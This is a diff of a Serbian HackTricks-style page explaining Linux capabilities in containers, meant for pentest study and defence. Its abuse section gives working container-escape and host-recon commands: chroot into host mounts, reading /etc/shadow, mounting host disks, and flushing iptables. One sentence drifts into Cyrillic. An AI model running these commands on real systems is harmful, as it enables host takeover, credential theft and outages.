@@ -1,71 +1,73 @@
-# Linux kapaciteti u kontejnerima
+# Linux sposobnosti (capabilities) u kontejnerima
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
 ## Pregled
 
-Linux capabilities su jedan od najvažnijih delova bezbednosti kontejnera jer odgovaraju na suptilno ali fundamentalno pitanje: **šta zapravo znači "root" unutar kontejnera?** Na normalnom Linux sistemu, UID 0 je istorijski podrazumevao veoma širok skup privilegija. U modernim kernelima ta privilegija je razložena u manje jedinice zvane capabilities. Proces može biti pokrenut kao root i ipak mu nedostaju mnoge moćne operacije ako su relevantne capabilities uklonjene.
+Linux capabilities su jedan od najvažnijih delova sigurnosti kontejnera zato što odgovaraju na suptilno ali fundamentalno pitanje: **šta „root“ zaista znači unutar kontejnera?** Na običnom Linux sistemu, UID 0 je istorijski podrazumevao veoma širok skup privilegija. U modernim kernelima ta privilegija je dekomponovana u manje jedinice nazvane capabilities. Proces može da radi kao root, a ipak da nema mnoge moćne operacije ako su relevantne capabilities uklonjene.
 
-Kontejneri se u velikoj meri oslanjaju na ovu distinkciju. Mnogi workloads se i dalje pokreću kao UID 0 unutar kontejnera iz razloga kompatibilnosti ili jednostavnosti. Bez capability dropping to bi bilo previše opasno. Sa capability dropping, containerized root proces i dalje može obavljati mnoge obične zadatke unutar kontejnera dok mu se uskraćuju osetljivije kernel operacije. Zato container shell koji kaže `uid=0(root)` ne znači automatski "host root" ili čak "široke kernel privilegije". Capability setovi odlučuju koliko ta root identitet zapravo vredi.
+Kontejneri uveliko zavise od ove distinkcije. Mnogi workload-ovi se i dalje pokreću kao UID 0 unutar kontejnera iz razloga kompatibilnosti ili jednostavnosti. Bez uklanjanja capabilities to bi bilo previše opasno. Sa uklanjanjem capabilities, proces root u kontejneru i dalje može da izvršava mnoge uobičajene zadatke unutar kontejnera dok mu se uskraćuju osetljivije kernel operacije. Zato shell u kontejneru koji kaže `uid=0(root)` ne znači automatski „root na hostu“ ili čak „široke kernel privilegije“. Skupovi capabilities odlučuju koliko ta root identifikacija zaista vredi.
 
-Za kompletnu Linux capability referencu i mnoge primere zloupotrebe, vidi:
+Za kompletnu referencu Linux capabilities i mnogo primera zloupotrebe, vidi:
 
 {{#ref}}
 ../../linux-capabilities.md
 {{#endref}}
 
-## Operacija
+## Kako funkcionišu
 
-Capabilities se prate u nekoliko setova, uključujući permitted, effective, inheritable, ambient, i bounding setove. Za mnoge procene kontejnera, tačna kernel semantika svakog seta je manje odmah važna od krajnjeg praktičnog pitanja: **koje privilegovane operacije ovaj proces može uspešno izvršiti sada, i koja buduća dobijanja privilegija su još moguća?**
+Capabilities se prate u nekoliko skupova, uključujući permitted, effective, inheritable, ambient i bounding setove. Za mnoge procene kontejnera, tačna kernel semantika svakog skupa nije odmah toliko važna kao konačno praktično pitanje: **koje privilegovane operacije ovaj proces trenutno može uspešno da izvrši, i koja buduća dobijanja privilegija su još moguća?**
 
-Razlog zašto je ovo važno je što su mnoge breakout tehnike ustvari capability problemi prikriveni kao container problemi. Workload sa `CAP_SYS_ADMIN` može dostići ogroman deo kernel funkcionalnosti koju normalan container root proces ne bi trebalo da dira. Workload sa `CAP_NET_ADMIN` postaje mnogo opasniji ako takođe deli host network namespace. Workload sa `CAP_SYS_PTRACE` postaje mnogo interesantniji ako može videti host procese kroz host PID sharing. U Docker ili Podman to se može pojaviti kao `--pid=host`; u Kubernetes to obično izgleda kao `hostPID: true`.
+Razlog zašto je ovo važno je što su mnoge tehnike bekreka zapravo problemi capabilities zamaskirani kao problemi kontejnera. Workload sa `CAP_SYS_ADMIN` može da pristupi ogromnom broju kernel funkcionalnosti koje normalan root proces u kontejneru ne bi trebalo da dodiruje. Workload sa `CAP_NET_ADMIN` postaje mnogo opasniji ako takođe deli host network namespace. Workload sa `CAP_SYS_PTRACE` postaje mnogo interesantniji ako može da vidi host procese kroz deljenje host PID namespace-a. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`; u Kubernetes-u se obično pojavljuje kao `hostPID: true`.
 
-Drugim rečima, capability set ne može biti evaluiran izolovano. Mora se čitati zajedno sa namespaces, seccomp, i MAC policy.
+Drugim rečima, skup capabilities ne može da se proceni izolovano. Mora se čitati zajedno sa namespaces, seccomp, i MAC policy.
 
-## Lab
+## Laboratorija
 
-Vrlo direktan način da se inspekcija capabilities unutar kontejnera izvrši je:
+Veoma direktan način da se ispituju capabilities unutar kontejnera je:
 ```bash
 docker run --rm -it debian:stable-slim bash
 apt-get update && apt-get install -y libcap2-bin
 capsh --print
 ```
-Takođe možete uporediti više ograničen container sa onim kojem su dodate sve capabilities:
+Takođe možete uporediti restriktivniji container sa onim kojem su dodate sve capabilities:
 ```bash
 docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 ```
-Da biste videli efekat uskog dodatka, pokušajte da uklonite sve i ponovo dodate samo jednu capability:
+Da biste videli efekat suženog dodavanja, pokušajte da uklonite sve i dodate nazad samo jednu capability:
 ```bash
 docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 ```
-Ovi mali eksperimenti pomažu da se pokaže da runtime ne samo prebacuje boolean nazvan "privileged". On oblikuje stvarnu površinu privilegija dostupnu procesu.
+Ovi mali eksperimenti pomažu da se pokaže da runtime nije jednostavno prebacivanje booleana nazvanog "privileged". On oblikuje stvarnu površinu privilegija dostupnu procesu.
 
-## Visoko rizične capabilities
+## Visoko rizične mogućnosti
 
-**`CAP_SYS_ADMIN`** je ona prema kojoj bi odbrambeni timovi trebalo da budu najoprezniji. Često se opisuje kao "the new root" jer otključava ogroman broj funkcionalnosti, uključujući operacije vezane za mount, ponašanje osetljivo na namespace i mnoge kernel putanje koje ne bi trebalo olako izlagati kontejnerima. Ako kontejner ima `CAP_SYS_ADMIN`, slab seccomp i nema snažno MAC ograničenje, mnogi klasični putevi za bekstvo postaju mnogo realističniji.
+Iako mnoge capabilities mogu biti važne u zavisnosti od cilja, nekoliko njih se ponavlja kao relevantno u analizi bekstva iz kontejnera.
 
-**`CAP_SYS_PTRACE`** je važan kada postoji vidljivost procesa, posebno ako je PID namespace deljen sa hostom ili sa interesantnim susednim workload-ovima. Može pretvoriti vidljivost u manipulisanje.
+**`CAP_SYS_ADMIN`** je onaj koji bi branitelji trebalo da tretiraju sa najvećim oprezom. Često se opisuje kao "novi root" zato što otključava ogroman broj funkcionalnosti, uključujući operacije vezane za mount, ponašanje zavisno od namespace-a i mnoge kernel putanje koje nikada ne bi trebalo olako izlagati kontejnerima. Ako kontejner ima `CAP_SYS_ADMIN`, slab seccomp i nema snažna MAC ograničenja, mnogi klasični putevi za proboj postaju mnogo realističniji.
 
-**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** su značajni u mrežno orijentisanim okruženjima. Na izolovanoj bridge mreži već mogu biti rizični; u deljenom host network namespace-u su mnogo gori jer workload može rekonfigurisati host mrežu, sniff, spoof ili ometati lokalne tokove saobraćaja.
+**`CAP_SYS_PTRACE`** je važan kada postoji vidljivost procesa, naročito ako je PID namespace deljen sa hostom ili sa relevantnim susednim workload-ovima. Može pretvoriti vidljivost u mogućnost manipulacije.
 
-**`CAP_SYS_MODULE`** je obično katastrofalan u rootful okruženju zato što učitavanje kernel modula efektivno znači kontrolu nad host kernelom. Skoro nikada ne bi trebalo da se pojavljuje u general-purpose container workload-u.
+**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** su važni u okruženjima fokusiranim na mrežu. Na izolovanoj bridge mreži oni mogu već predstavljati rizik; na deljenom host network namespace-u su mnogo gori jer workload može moći da rekonfiguriše host networking, presreće, falsifikuje ili ometa lokalne tokove saobraćaja.
 
-## Korišćenje runtime-a
+**`CAP_SYS_MODULE`** je obično katastrofalan u okruženju sa pristupom root-u jer učitavanje kernel modula efektivno znači kontrolu nad host kernelom. Skoro nikada ne bi trebalo da se pojavi u opštem kontejnerskom workload-u.
 
-Docker, Podman, stackovi zasnovani na containerd i CRI-O svi koriste kontrole capability-ja, ali podrazumevana podešavanja i interfejsi za upravljanje se razlikuju. Docker ih izlaže veoma direktno kroz flagove kao što su `--cap-drop` i `--cap-add`. Podman izlaže slične kontrole i često ima koristi od rootless izvršavanja kao dodatnog sloja bezbednosti. Kubernetes izlaže dodavanja i uklanjanja capability-ja kroz Pod ili container `securityContext`. System-container okruženja kao što su LXC/Incus takođe se oslanjaju na kontrolu capability-ja, ali šira integracija sa hostom u tim sistemima često navodi operatore da opuštaju podrazumevana podešavanja agresivnije nego što bi to uradili u app-container okruženju.
+## Korišćenje u runtime-u
 
-Isti princip važi za sve: capability koja je tehnički moguće dodeliti nije nužno i ona koja bi trebalo da bude dodeljena. Mnogi realni incidenti počinju kada operator doda capability jednostavno zato što workload nije radio pod strožom konfiguracijom i tim je želeo brzo rešenje.
+Docker, Podman, stackovi zasnovani na containerd i CRI-O svi koriste kontrolu capabilities, ali podrazumevane vrednosti i interfejsi za upravljanje se razlikuju. Docker ih eksponira vrlo direktno kroz flagove kao što su `--cap-drop` i `--cap-add`. Podman izlaže slične kontrole i često ima koristi od rootless izvršavanja kao dodatnog sloja bezbednosti. Kubernetes omogućava dodavanje i uklanjanje capabilities kroz Pod ili container `securityContext`. System-container okruženja kao što su LXC/Incus takođe se oslanjaju na kontrolu capabilities, ali šira integracija tih sistema sa hostom često mami operatore da agresivnije opuštaju podrazumevana podešavanja nego što bi to radili u app-container okruženju.
+
+Isti princip važi za sve njih: capability koji je tehnički moguće dodeliti nije nužno nešto što bi trebalo dodeliti. Mnogi incidenti iz stvarnog sveta počinju kada operator doda capability jednostavno zato što workload nije radio pod strožom konfiguracijom i tim je trebao brzo rešenje.
 
 ## Pogrešne konfiguracije
 
-Najočitija greška je **`--cap-add=ALL`** u CLI-jevima tipa Docker/Podman, ali to nije jedina. U praksi je češći problem dodeljivanje jedne ili dve izuzetno moćne capability, posebno `CAP_SYS_ADMIN`, da bi "aplikacija radila" bez razumevanja implikacija na namespace, seccomp i mount. Drugi čest način greške je kombinovanje dodatnih capability-ja sa deljenjem host namespace-a. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`, `--network=host`, ili `--userns=host`; u Kubernetes-u ekvivalentna izloženost obično se pojavljuje kroz podešavanja workload-a kao što su `hostPID: true` ili `hostNetwork: true`. Svaka od tih kombinacija menja šta capability zaista može uticati.
+Najočiglednija greška je **`--cap-add=ALL`** u Docker/Podman-style CLI-jima, ali to nije jedina. U praksi, češći problem je davanje jedne ili dve izuzetno moćne capabilities, naročito `CAP_SYS_ADMIN`, kako bi "aplikacija radila" bez razumevanja implikacija na namespace, seccomp i mount. Drugi čest način greške je kombinovanje dodatnih capabilities sa deljenjem host namespace-a. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`, `--network=host`, ili `--userns=host`; u Kubernetes-u ekvivalentna izloženost obično se pojavljuje kroz podešavanja workload-a kao što su `hostPID: true` ili `hostNetwork: true`. Svaka od tih kombinacija menja šta capability zapravo može uticati.
 
-Takođe je često da administratori veruju da zato što workload nije u potpunosti `--privileged`, on je i dalje značajno ograničen. Ponekad je to tačno, ali ponekad je efektivno stanje već dovoljno blizu privilegovanom da razlika prestane da bude bitna u operativnom smislu.
+Takođe je uobičajeno da administratori veruju da zato što workload nije potpuno `--privileged`, on je i dalje značajno ograničen. Ponekad je to tačno, ali ponekad je efektivni položaj već dovoljno blizu privilegovanom da razlika prestane da bude bitna operacionalno.
 
 ## Zloupotreba
 
-Prvi praktičan korak je da se izlista efektivan skup capability-ja i odmah testiraju capability-specifične akcije koje bi bile važne za bekstvo ili pristup informacijama hosta:
+Prvi praktičan korak je da se izenumeri efektivni skup capabilities i odmah testiraju capability-specifične akcije koje bi bile važne za bekstvo iz kontejnera ili pristup informacijama hosta:
 ```bash
 capsh --print
 grep '^Cap' /proc/self/status
@@ -77,44 +79,44 @@ mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
 mount | head
 find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
 ```
-Ako je prisutan `CAP_SYS_PTRACE` i kontejner može da vidi interesantne procese, proverite da li se taj capability može iskoristiti za inspekciju procesa:
+Ako je `CAP_SYS_PTRACE` prisutan i kontejner može da vidi interesantne procese, proverite da li se ta dozvola može iskoristiti za inspekciju procesa:
 ```bash
 capsh --print | grep cap_sys_ptrace
 ps -ef | head
 for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
 ```
-Ako je prisutan `CAP_NET_ADMIN` ili `CAP_NET_RAW`, testirajte da li workload može manipulisati vidljivim mrežnim stekom ili bar prikupiti korisne mrežne informacije:
+Ako su prisutni `CAP_NET_ADMIN` ili `CAP_NET_RAW`, proverite da li workload može da manipuliše vidljivim mrežnim stogom ili makar da prikupi korisne informacije o mreži:
 ```bash
 capsh --print | grep -E 'cap_net_admin|cap_net_raw'
 ip addr
 ip route
 iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ```
-Kada test capability-a uspe, kombinujte ga sa stanjem namespace-a. Capability koja u izolovanom namespace-u deluje tek rizično može odmah postati escape ili host-recon primitive kada kontejner takođe deli host PID, host network ili host mounts.
+Kada test capability-a uspe, kombinujte ga sa situacijom namespace-a. Capability koji izgleda samo rizično u izolovanom namespace-u može odmah postati escape ili host-recon primitiv kada kontejner takođe deli host PID, host network, ili host mounts.
 
 ### Potpun primer: `CAP_SYS_ADMIN` + Host Mount = Host Escape
 
-Ako kontejner ima `CAP_SYS_ADMIN` i upisiv bind mount host fajl sistema, kao što je `/host`, put do escape-a je često jednostavan:
+Ako kontejner ima `CAP_SYS_ADMIN` i upisiv bind mount host filesystem-a kao što je `/host`, put za escape je često jednostavan:
 ```bash
 capsh --print | grep cap_sys_admin
 mount | grep ' /host '
 ls -la /host
 chroot /host /bin/bash
 ```
-Ako `chroot` uspe, komande se sada izvršavaju u kontekstu root fajl sistema hosta:
+Ako `chroot` uspe, komande se sada izvršavaju u kontekstu root datotečnog sistema hosta:
 ```bash
 id
 hostname
 cat /etc/shadow | head
 ```
-Ako `chroot` nije dostupan, isti rezultat se često može postići pozivanjem binarne datoteke kroz montirano stablo:
+Ako `chroot` nije dostupan, isti rezultat se često može postići pozivanjem binary datoteke kroz montirano stablo:
 ```bash
 /host/bin/bash -p
 export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
 ```
-### Kompletan primer: `CAP_SYS_ADMIN` + pristup uređaju
+### Potpun primer: `CAP_SYS_ADMIN` + Device Access
 
-Ako je blok uređaj sa hosta izložen, `CAP_SYS_ADMIN` može ga pretvoriti u direktan pristup datotečnom sistemu hosta:
+Ako je blok uređaj sa hosta izložen, `CAP_SYS_ADMIN` može да ga претвори у директан приступ датотечном систему hosta:
 ```bash
 ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 mkdir -p /mnt/hostdisk
@@ -122,9 +124,9 @@ mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/de
 ls -la /mnt/hostdisk
 chroot /mnt/hostdisk /bin/bash 2>/dev/null
 ```
-### Potpun primer: `CAP_NET_ADMIN` + Host Networking
+### Kompletan primer: `CAP_NET_ADMIN` + mreža hosta
 
-Ova kombinacija ne dovodi uvek direktno do host root, ali može u potpunosti rekonfigurisati mrežni stack hosta:
+Ova kombinacija ne mora uvek direktno omogućiti root na hostu, ali može u potpunosti rekonfigurisati mrežni stack hosta:
 ```bash
 capsh --print | grep cap_net_admin
 ip addr
@@ -133,30 +135,31 @@ iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link set lo down 2>/dev/null
 iptables -F 2>/dev/null
 ```
-To može omogućiti denial of service, traffic interception, ili pristup servisima koji su ranije bili filtrirani.
+To može omogućiti denial of service, presretanje saobraćaja ili pristup servisima koji su ranije bili filtrirani.
 
 ## Checks
 
-Cilj capability checks nije samo da dump raw values, već da se razume da li proces ima dovoljno privilegija da njegovo trenutno namespace i mount stanje učini opasnim.
+Cilj capability checks nije samo da ispiše raw values, već da se utvrdi da li proces ima dovoljno privilegija da njegova trenutna namespace i mount situacija budu opasne.
 ```bash
 capsh --print                    # Human-readable capability sets and securebits
 grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
 ```
-Zanimljivo ovde:
+Šta je ovde interesantno:
 
-- `capsh --print` je najlakši način da uočite visokorizične capabilities kao što su `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, ili `cap_sys_module`.
-- Linija `CapEff` u `/proc/self/status` pokazuje šta je zapravo efektivno sada, a ne samo šta bi moglo biti dostupno u drugim setovima.
-- capability dump postaje mnogo važniji ako container takođe deli host PID, network, ili user namespaces, ili ima writable host mounts.
+- `capsh --print` je najjednostavniji način da se uoče visokorizične capabilities kao što su `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, ili `cap_sys_module`.
+- Linija `CapEff` u `/proc/self/status` pokazuje šta je zapravo efektivno sada, a ne samo šta bi moglo biti dostupno u drugim skupovima.
+- Dump capabilities postaje mnogo važniji ako container takođe deli host PID, network, ili user namespaces, ili ima host mount-ove koji su upisivi.
 
-Nakon prikupljanja sirovih informacija o capabilities, sledeći korak je interpretacija. Zapitajte se da li je proces root, da li su user namespaces aktivni, da li su host namespaces deljeni, da li seccomp primenjuje/je enforcing, i da li AppArmor ili SELinux i dalje ograničavaju proces. Capability set sam po sebi je samo deo priče, ali često je deo koji objašnjava zašto jedan container breakout radi, a drugi ne sa istom prividnom polaznom tačkom.
+Nakon prikupljanja sirovih informacija o capabilities, sledeći korak je interpretacija. Postavite pitanje da li je proces root, da li su user namespaces aktivne, da li se host namespaces dele, da li seccomp primenjuje pravila, i da li AppArmor ili SELinux i dalje ograničavaju proces. Skup capabilities sam po sebi je samo deo priče, ali često je upravo on deo koji objašnjava zašto jedan container breakout uspeva, a drugi ne sa istom naizgled početnom tačkom.
 
-## Podrazumevana podešavanja
+## Runtime Defaults
 
-| Runtime / platform | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
+| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno oslabljenje |
 | --- | --- | --- | --- |
-| Docker Engine | Podrazumevano smanjen set capabilities | Docker zadržava podrazumevanu allowlistu capabilities i uklanja ostale | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
-| Podman | Podrazumevano smanjen set capabilities | Podman containeri su po defaultu unprivileged i koriste smanjeni capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
-| Kubernetes | Nasleđuje runtime podrazumevana osim ako nije promenjeno | Ako `securityContext.capabilities` nisu navedene, container dobija podrazumevani capability set iz runtime-a | `securityContext.capabilities.add`, failing to `drop: ["ALL"]`, `privileged: true` |
-| containerd / CRI-O under Kubernetes | Obično runtime podrazumevano | Efektivni set zavisi od runtime-a plus Pod spec | isto kao i red u Kubernetesu; direktna OCI/CRI konfiguracija takođe može eksplicitno dodati capabilities |
+| Docker Engine | Smanjen skup capabilities po defaultu | Docker zadržava podrazumevanu listu dozvoljenih capabilities i odbacuje ostale | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
+| Podman | Smanjen skup capabilities po defaultu | Podman containeri su po defaultu neprivilegovani i koriste model sa smanjenim capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
+| Kubernetes | Nasleđuje runtime podrazumevane vrednosti osim ako nisu promenjene | Ako nisu navedeni `securityContext.capabilities`, container dobija podrazumevani skup capabilities iz runtime-a | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
+| containerd / CRI-O under Kubernetes | Obično runtime podrazumevano | Efektivni skup zavisi od runtime-a plus Pod spec | isto kao u Kubernetes redu; direktna OCI/CRI konfiguracija takođe može eksplicitno dodati capabilities |
 
-Za Kubernetes, važna poenta je da API ne definiše jedinstveni univerzalni podrazumevani capability set. Ako Pod ne doda ili ne ukloni capabilities, workload nasleđuje runtime podrazumevano za taj čvor.
+Za Kubernetes, važna poenta je da API ne definiše jedan univerzalni podrazumevani skup capabilities. Ako Pod ne dodaje niti ne uklanja capabilities, workload nasleđuje runtime podrazumevano za taj node.
+{{#include ../../../../banners/hacktricks-training.md}}
